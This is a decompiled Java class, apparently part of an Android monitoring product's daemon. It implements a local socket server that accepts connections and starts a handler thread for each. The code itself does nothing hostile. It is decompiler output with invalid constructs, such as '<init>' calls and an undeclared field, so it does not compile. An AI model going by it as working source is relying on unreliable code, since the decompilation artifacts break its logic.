package com.vvt.al;

import android.net.LocalServerSocket;
import android.net.LocalSocket;
import java.io.IOException;
import java.io.InputStream;

class f
  implements Runnable
{
  private volatile boolean b;
  private final String c;
  private e d;
  private LocalServerSocket e;
  
  public f(d paramd, String paramString)
  {
    this.c = paramString;
    this.b = false;
  }
  
  public void a()
  {
    boolean bool = d.g();
    if (bool) {}
    bool = false;
    LocalServerSocket localLocalServerSocket = null;
    this.b = false;
    try
    {
      localLocalServerSocket = this.e;
      localLocalServerSocket.close();
      return;
    }
    catch (IOException localIOException)
    {
      for (;;)
      {
        localIOException.printStackTrace();
      }
    }
  }
  
  public void run()
  {
    boolean bool = true;
    this.b = bool;
    try
    {
      Object localObject1 = new android/net/LocalServerSocket;
      Object localObject2 = this.c;
      ((LocalServerSocket)localObject1).<init>((String)localObject2);
      this.e = ((LocalServerSocket)localObject1);
      for (;;)
      {
        bool = this.b;
        if (!bool) {
          break;
        }
        localObject1 = this.e;
        localObject1 = ((LocalServerSocket)localObject1).accept();
        localObject2 = new com/vvt/al/e;
        d locald = this.a;
        InputStream localInputStream = ((LocalSocket)localObject1).getInputStream();
        ((e)localObject2).<init>(locald, localInputStream, (LocalSocket)localObject1);
        this.d = ((e)localObject2);
        localObject1 = new java/lang/Thread;
        localObject2 = this.d;
        ((Thread)localObject1).<init>((Runnable)localObject2);
        ((Thread)localObject1).start();
      }
      return;
    }
    catch (IOException localIOException)
    {
      bool = d.h();
      if (!bool) {}
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/al/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */